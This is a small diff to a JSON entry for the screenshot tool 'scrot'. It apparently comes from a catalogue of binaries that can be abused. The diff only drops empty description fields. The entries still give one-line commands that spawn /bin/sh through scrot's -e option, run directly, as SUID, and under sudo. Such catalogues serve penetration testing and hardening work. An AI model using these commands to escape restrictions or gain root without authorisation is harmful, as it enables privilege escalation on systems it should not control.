@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "scrot -e /bin/sh\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./scrot -e /bin/sh\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo scrot -e /bin/sh\n"
       }
     ]
